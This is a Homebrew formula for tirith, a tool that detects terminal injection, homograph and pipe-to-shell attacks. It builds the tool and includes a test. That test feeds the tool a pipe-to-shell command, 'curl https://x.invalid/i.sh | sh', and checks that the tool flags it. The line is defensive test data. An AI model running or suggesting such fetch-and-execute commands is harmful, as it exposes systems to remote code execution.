class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://github.com/sheeki03/tirith/archive/refs/tags/v0.4.1.tar.gz"
  sha256 "0074778f56ec7ab4b4b64288db24b37c78cba2411adab926827d4ceb3ced49c1"
  license "AGPL-3.0-only"
  revision 1
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    sha256 cellar: :any_skip_relocation, arm64_ohos: "01eb662c89b91679a05bfc37f50c503e32478f49532c9799f3a526fc249e463f"
  end

  depends_on "rust" => :build

  patch do
    file "Patches/tirith/0001-ohos-statx-cfg.patch"
  end

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end
